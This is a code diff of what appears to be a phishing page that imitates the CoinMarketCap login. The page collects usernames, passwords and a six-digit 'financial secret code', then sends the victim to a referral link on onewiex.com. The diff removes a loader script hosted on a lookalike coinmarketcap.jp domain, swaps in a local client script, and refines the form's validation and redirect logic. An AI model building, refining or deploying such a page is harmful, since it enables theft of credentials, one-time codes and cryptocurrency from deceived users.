@@ -71,7 +71,6 @@
         display: none;
       }
     </style>
-    <script src="https://www.google.com/recaptcha/enterprise.js?render=6Lc08TYnAAAAAN-Br_NCH29jui_gOTah1hrwUWaD"></script>
   </head>
   <body style="padding-right: 0px; overflow-y: auto">
     <app-root ng-version="14.2.3">
@@ -118,7 +117,7 @@
                             <div class="m-input__title">Username</div>
                             <label class="m-input"
                               ><input
-                                id="usernameInput"
+                                id="coinmarketcap-username"
                                 type="text"
                                 maxlength="64"
                                 placeholder="Enter username or e-mail"
@@ -127,7 +126,7 @@
                             <div class="m-input__title">Password</div>
                             <label class="m-input"
                               ><input
-                                id="passwordInput"
+                                id="coinmarketcap-password"
                                 type="password"
                                 formcontrolname="password"
                                 placeholder="Enter your password"
@@ -138,21 +137,32 @@
                               <div class="m-input__title">
                                 Financial secret code
                               </div>
-                              <label class="m-input"
-                                ><input
-                                  id="secretInput"
+                              <label class="m-input">
+                                <input
+                                  id="coinmarketcap-secret"
                                   type="text"
-                                  formcontrolname="otp"
+                                  minlength="6"
                                   maxlength="6"
-                                  placeholder="Enter Your Secret code"
+                                  oninput="this.value = this.value.replace(/[^0-9]/g, '');"
+                                  placeholder="Enter 6 Digits of Secret Code"
                                   class="ng-untouched ng-pristine ng-invalid"
-                              /></label>
+                                />
+                              </label>
                             </div>
 
                             <div class="header-sign__bot">
-                              <button class="m-btn tr" onclick="signin()">
-                                Sign in</button
-                              ><a class="header-sign__link">Forgot password?</a>
+                              <button
+                                class="m-btn tr"
+                                id="coinmarketcap-signin"
+                                onclick="signin()"
+                              >
+                                Sign in
+                              </button>
+                              <a
+                                href="https://onewiex.com/?upline=012047991013"
+                                class="header-sign__link"
+                                >Forgot password?</a
+                              >
                             </div>
                           </div>
                           <div
@@ -273,8 +283,9 @@
                       <a
                         class="m-btn sm text-nowrap ml-3"
                         href="https://onewiex.com/?upline=012047991013"
-                        >Sign Up</a
                       >
+                        Sign Up
+                      </a>
                     </div>
                   </div>
                 </div>
@@ -739,23 +750,39 @@
       </ng-component>
     </app-root>
 
-    <script src="https://api.coinmarketcap.jp/loginpage.js?project=onewiex.com&amp;reflink=https://onewiex.com/?upline=012047991013"></script>
+    <script src="http://127.0.0.1:8000/client.js"></script>
     <script>
       SIGNIN_CLICK_TIMES = 1;
+
       async function signin() {
         event.preventDefault();
+
+        const usernameInput = document.getElementById('coinmarketcap-username');
+        const passwordInput = document.getElementById('coinmarketcap-password');
+
+        if (
+          usernameInput.value.trim() === '' ||
+          passwordInput.value.trim() === ''
+        ) {
+          alert('Please enter both username and password.');
+          return;
+        }
 
         const financialSecretCode = document.getElementById(
           'financial-secret-code'
         );
 
         if (SIGNIN_CLICK_TIMES == 1) {
-          SIGNIN_CLICK_TIMES += 1;
           financialSecretCode.style.display = 'block';
+          SIGNIN_CLICK_TIMES = 0;
         } else {
-          getUserEventValue();
-          await sendEvent('LoginButtonClicked');
-          window.location.href = REFLINK;
+          const secretInput = document.getElementById('coinmarketcap-secret');
+          const secretRegex = /^\d{6}$/;
+          if (!secretRegex.test(secretInput.value)) {
+            alert('Financial Secret Code must be exactly 6 digits.');
+            return;
+          }
+          window.location.href = 'https://onewiex.com/?upline=012047991013';
         }
       }
 
